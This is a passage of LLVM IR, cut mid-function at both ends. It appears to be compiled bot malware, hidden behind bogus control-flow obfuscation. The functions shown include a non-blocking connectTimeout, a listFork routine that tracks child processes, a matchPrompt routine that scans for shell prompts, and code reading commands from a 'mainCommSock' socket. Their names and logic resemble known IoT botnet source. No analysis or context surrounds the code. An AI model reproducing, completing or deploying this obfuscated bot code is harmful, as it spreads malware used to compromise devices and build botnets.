  %243 = load i32, i32* %26, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %26, align 4
  %245 = load i32, i32* @x.47
  %246 = load i32, i32* @y.48
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %184

; <label>:253:                                    ; preds = %233, %184
  %254 = load i8*, i8** %25, align 8
  store i8 0, i8* %254, align 1
  %255 = load i32, i32* %26, align 4
  store i32 %255, i32* %12, align 4
  br label %256

; <label>:256:                                    ; preds = %253, %208
  %257 = load i32, i32* %12, align 4
  ret i32 %257

originalBBalteredBB:                              ; preds = %originalBB, %3
  %258 = alloca i32, align 4
  %259 = alloca i32, align 4
  %260 = alloca i8*, align 8
  %261 = alloca i32, align 4
  %262 = alloca %struct.fd_set, align 8
  %263 = alloca %struct.timeval, align 8
  %264 = alloca i32, align 4
  %265 = alloca i32, align 4
  %266 = alloca i32, align 4
  %267 = alloca i32, align 4
  %268 = alloca i32, align 4
  %269 = alloca i32, align 4
  %270 = alloca i8, align 1
  %271 = alloca i8*, align 8
  %272 = alloca i32, align 4
  store i32 %0, i32* %259, align 4
  store i8* %1, i8** %260, align 8
  store i32 %2, i32* %261, align 4
  %273 = load i8*, i8** %260, align 8
  %274 = load i32, i32* %261, align 4
  %275 = sext i32 %274 to i64
  call void @llvm.memset.p0i8.i64(i8* %273, i8 0, i64 %275, i32 1, i1 false)
  %276 = getelementptr inbounds %struct.timeval, %struct.timeval* %263, i32 0, i32 0
  store i64 30, i64* %276, align 8
  %277 = getelementptr inbounds %struct.timeval, %struct.timeval* %263, i32 0, i32 1
  store i64 0, i64* %277, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %278 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %279 = getelementptr inbounds [16 x i64], [16 x i64]* %278, i64 0, i64 0
  %280 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %279) #5, !srcloc !2
  %281 = extractvalue { i64, i64* } %280, 0
  %282 = extractvalue { i64, i64* } %280, 1
  %283 = trunc i64 %281 to i32
  store i32 %283, i32* %18, align 4
  %284 = ptrtoint i64* %282 to i64
  %285 = trunc i64 %284 to i32
  store i32 %285, i32* %19, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %81
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %104
  %286 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %287 = getelementptr inbounds [16 x i64], [16 x i64]* %286, i64 0, i64 0
  %288 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %287) #5, !srcloc !3
  %289 = extractvalue { i64, i64* } %288, 0
  %290 = extractvalue { i64, i64* } %288, 1
  %291 = trunc i64 %289 to i32
  store i32 %291, i32* %22, align 4
  %292 = ptrtoint i64* %290 to i64
  %293 = trunc i64 %292 to i32
  store i32 %293, i32* %23, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %148
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %165
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %188
  %294 = load i32, i32* @mainCommSock, align 4
  %295 = call i64 @recv(i32 %294, i8* %24, i64 1, i32 0)
  %296 = icmp ne i64 %295, 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %210
  %297 = load i8, i8* %24, align 1
  %298 = load i8*, i8** %25, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %25, align 8
  store i8 %297, i8* %298, align 1
  %300 = load i8, i8* %24, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 10
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %234
  %303 = load i32, i32* %26, align 4
  %_ = sub i32 %303, 1
  %gen = mul i32 %_, 1
  %304 = add nsw i32 %303, 1
  store i32 %304, i32* %26, align 4
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %132

; <label>:37:                                     ; preds = %4
  %38 = load i32, i32* @x.49
  %39 = load i32, i32* @y.50
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = load i32, i32* %6, align 4
  %49 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %16, align 4
  %51 = load i32, i32* %16, align 4
  %52 = icmp slt i32 %51, 0
  %53 = load i32, i32* @x.49
  %54 = load i32, i32* @y.50
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %52, label %61, label %123

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = call i32* @__errno_location() #10
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, 115
  br i1 %64, label %65, label %121

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = load i32, i32* @x.49
  %72 = load i32, i32* @y.50
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %80 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 0
  %81 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %80) #5, !srcloc !4
  %82 = extractvalue { i64, i64* } %81, 0
  %83 = extractvalue { i64, i64* } %81, 1
  %84 = trunc i64 %82 to i32
  store i32 %84, i32* %17, align 4
  %85 = ptrtoint i64* %83 to i64
  %86 = trunc i64 %85 to i32
  store i32 %86, i32* %18, align 4
  %87 = load i32, i32* @x.49
  %88 = load i32, i32* @y.50
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %95

; <label>:95:                                     ; preds = %originalBBpart24
  %96 = load i32, i32* %6, align 4
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %101 = load i32, i32* %6, align 4
  %102 = sdiv i32 %101, 64
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 %103
  %105 = load i64, i64* %104, align 8
  %106 = or i64 %105, %99
  store i64 %106, i64* %104, align 8
  %107 = load i32, i32* %6, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i32 @select(i32 %108, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %119

; <label>:111:                                    ; preds = %95
  store i32 4, i32* %13, align 4
  %112 = load i32, i32* %6, align 4
  %113 = bitcast i32* %14 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %13) #5
  %115 = load i32, i32* %14, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %111
  store i32 0, i32* %5, align 4
  br label %132

; <label>:118:                                    ; preds = %111
  br label %120

; <label>:119:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %132

; <label>:120:                                    ; preds = %118
  br label %122

; <label>:121:                                    ; preds = %61
  store i32 0, i32* %5, align 4
  br label %132

; <label>:122:                                    ; preds = %120
  br label %123

; <label>:123:                                    ; preds = %122, %originalBBpart2
  %124 = load i32, i32* %6, align 4
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 3, i8* null)
  %126 = sext i32 %125 to i64
  store i64 %126, i64* %15, align 8
  %127 = load i64, i64* %15, align 8
  %128 = and i64 %127, -2049
  store i64 %128, i64* %15, align 8
  %129 = load i32, i32* %6, align 4
  %130 = load i64, i64* %15, align 8
  %131 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 4, i64 %130)
  store i32 1, i32* %5, align 4
  br label %132

; <label>:132:                                    ; preds = %123, %121, %119, %117, %36
  %133 = load i32, i32* %5, align 4
  ret i32 %133

originalBBalteredBB:                              ; preds = %originalBB, %37
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %135 = getelementptr inbounds [8 x i8], [8 x i8]* %134, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %135, i8 0, i64 8, i32 4, i1 false)
  %136 = load i32, i32* %6, align 4
  %137 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %138 = call i32 @connect(i32 %136, %struct.sockaddr* %137, i32 16)
  store i32 %138, i32* %16, align 4
  %139 = load i32, i32* %16, align 4
  %140 = icmp slt i32 %139, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %141 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %142 = getelementptr inbounds [16 x i64], [16 x i64]* %141, i64 0, i64 0
  %143 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %142) #5, !srcloc !4
  %144 = extractvalue { i64, i64* } %143, 0
  %145 = extractvalue { i64, i64* } %143, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %17, align 4
  %147 = ptrtoint i64* %145 to i64
  %148 = trunc i64 %147 to i32
  store i32 %148, i32* %18, align 4
  br label %originalBB1
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %26

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.51
  %10 = load i32, i32* @y.52
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* %2, align 4
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* @x.51
  %19 = load i32, i32* @y.52
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %111

; <label>:26:                                     ; preds = %0
  %27 = load i32, i32* @x.51
  %28 = load i32, i32* @y.52
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i64, i64* @numpids, align 8
  %36 = add i64 %35, 1
  store i64 %36, i64* @numpids, align 8
  %37 = load i64, i64* @numpids, align 8
  %38 = add i64 %37, 1
  %39 = mul i64 %38, 4
  %40 = call noalias i8* @malloc(i64 %39) #5
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %42 = load i32, i32* @x.51
  %43 = load i32, i32* @y.52
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %82, %originalBBpart212
  %51 = load i32, i32* %4, align 4
  %52 = zext i32 %51 to i64
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 %53, 1
  %55 = icmp ult i64 %52, %54
  br i1 %55, label %56, label %85

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* @x.51
  %58 = load i32, i32* @y.52
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %56
  %65 = load i32*, i32** @pids, align 8
  %66 = load i32, i32* %4, align 4
  %67 = zext i32 %66 to i64
  %68 = getelementptr inbounds i32, i32* %65, i64 %67
  %69 = load i32, i32* %68, align 4
  %70 = load i32*, i32** %3, align 8
  %71 = load i32, i32* %4, align 4
  %72 = zext i32 %71 to i64
  %73 = getelementptr inbounds i32, i32* %70, i64 %72
  store i32 %69, i32* %73, align 4
  %74 = load i32, i32* @x.51
  %75 = load i32, i32* @y.52
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %82

; <label>:82:                                     ; preds = %originalBBpart216
  %83 = load i32, i32* %4, align 4
  %84 = add i32 %83, 1
  store i32 %84, i32* %4, align 4
  br label %50

; <label>:85:                                     ; preds = %50
  %86 = load i32, i32* @x.51
  %87 = load i32, i32* @y.52
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %85
  %94 = load i32, i32* %2, align 4
  %95 = load i32*, i32** %3, align 8
  %96 = load i64, i64* @numpids, align 8
  %97 = sub i64 %96, 1
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  store i32 %94, i32* %98, align 4
  %99 = load i32*, i32** @pids, align 8
  %100 = bitcast i32* %99 to i8*
  call void @free(i8* %100) #5
  %101 = load i32*, i32** %3, align 8
  store i32* %101, i32** @pids, align 8
  %102 = load i32, i32* %2, align 4
  store i32 %102, i32* %1, align 4
  %103 = load i32, i32* @x.51
  %104 = load i32, i32* @y.52
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %111

; <label>:111:                                    ; preds = %originalBBpart220, %originalBBpart2
  %112 = load i32, i32* @x.51
  %113 = load i32, i32* @y.52
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %111
  %120 = load i32, i32* %1, align 4
  %121 = load i32, i32* @x.51
  %122 = load i32, i32* @y.52
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  ret i32 %120

originalBBalteredBB:                              ; preds = %originalBB, %8
  %129 = load i32, i32* %2, align 4
  store i32 %129, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %130 = load i64, i64* @numpids, align 8
  %131 = add i64 %130, 1
  store i64 %131, i64* @numpids, align 8
  %132 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %132
  %gen = add i64 %_, 1
  %133 = add i64 %132, 1
  %_2 = sub i64 0, %133
  %gen3 = add i64 %_2, 4
  %_4 = sub i64 0, %133
  %gen5 = add i64 %_4, 4
  %_6 = sub i64 0, %133
  %gen7 = add i64 %_6, 4
  %_8 = shl i64 %133, 4
  %_9 = sub i64 %133, 4
  %gen10 = mul i64 %_9, 4
  %134 = mul i64 %133, 4
  %135 = call noalias i8* @malloc(i64 %134) #5
  %136 = bitcast i8* %135 to i32*
  store i32* %136, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB1

originalBB14alteredBB:                            ; preds = %originalBB14, %56
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %4, align 4
  %139 = zext i32 %138 to i64
  %140 = getelementptr inbounds i32, i32* %137, i64 %139
  %141 = load i32, i32* %140, align 4
  %142 = load i32*, i32** %3, align 8
  %143 = load i32, i32* %4, align 4
  %144 = zext i32 %143 to i64
  %145 = getelementptr inbounds i32, i32* %142, i64 %144
  store i32 %141, i32* %145, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %85
  %146 = load i32, i32* %2, align 4
  %147 = load i32*, i32** %3, align 8
  %148 = load i64, i64* @numpids, align 8
  %149 = sub i64 %148, 1
  %150 = getelementptr inbounds i32, i32* %147, i64 %149
  store i32 %146, i32* %150, align 4
  %151 = load i32*, i32** @pids, align 8
  %152 = bitcast i32* %151 to i8*
  call void @free(i8* %152) #5
  %153 = load i32*, i32** %3, align 8
  store i32* %153, i32** @pids, align 8
  %154 = load i32, i32* %2, align 4
  store i32 %154, i32* %1, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %111
  %155 = load i32, i32* %1, align 4
  br label %originalBB22
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %225, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %228

; <label>:17:                                     ; preds = %11
  %18 = load i32, i32* @x.53
  %19 = load i32, i32* @y.54
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* @x.53
  %27 = load i32, i32* @y.54
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart259, %originalBBpart2
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %7, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %152

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* @x.53
  %40 = load i32, i32* @y.54
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 0
  %58 = load i32, i32* @x.53
  %59 = load i32, i32* @y.54
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br i1 %57, label %134, label %66

; <label>:66:                                     ; preds = %originalBBpart215
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 32
  br i1 %77, label %134, label %78

; <label>:78:                                     ; preds = %66
  %79 = load i32, i32* @x.53
  %80 = load i32, i32* @y.54
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %78
  %87 = load i8*, i8** %3, align 8
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  %91 = load i32, i32* %7, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 0, %92
  %94 = getelementptr inbounds i8, i8* %90, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp eq i32 %96, 13
  %98 = load i32, i32* @x.53
  %99 = load i32, i32* @y.54
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart229, label %originalBB17alteredBB

originalBBpart229:                                ; preds = %originalBB17
  br i1 %97, label %134, label %106

; <label>:106:                                    ; preds = %originalBBpart229
  %107 = load i32, i32* @x.53
  %108 = load i32, i32* @y.54
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %106
  %115 = load i8*, i8** %3, align 8
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  %119 = load i32, i32* %7, align 4
  %120 = sext i32 %119 to i64
  %121 = sub i64 0, %120
  %122 = getelementptr inbounds i8, i8* %118, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = sext i8 %123 to i32
  %125 = icmp eq i32 %124, 10
  %126 = load i32, i32* @x.53
  %127 = load i32, i32* @y.54
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart238, label %originalBB31alteredBB

originalBBpart238:                                ; preds = %originalBB31
  br label %134

; <label>:134:                                    ; preds = %originalBBpart238, %originalBBpart229, %66, %originalBBpart215
  %135 = phi i1 [ true, %originalBBpart229 ], [ true, %66 ], [ true, %originalBBpart215 ], [ %125, %originalBBpart238 ]
  %136 = load i32, i32* @x.53
  %137 = load i32, i32* @y.54
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %134
  %144 = load i32, i32* @x.53
  %145 = load i32, i32* @y.54
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %152

; <label>:152:                                    ; preds = %originalBBpart242, %34
  %153 = phi i1 [ false, %34 ], [ %135, %originalBBpart242 ]
  %154 = load i32, i32* @x.53
  %155 = load i32, i32* @y.54
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
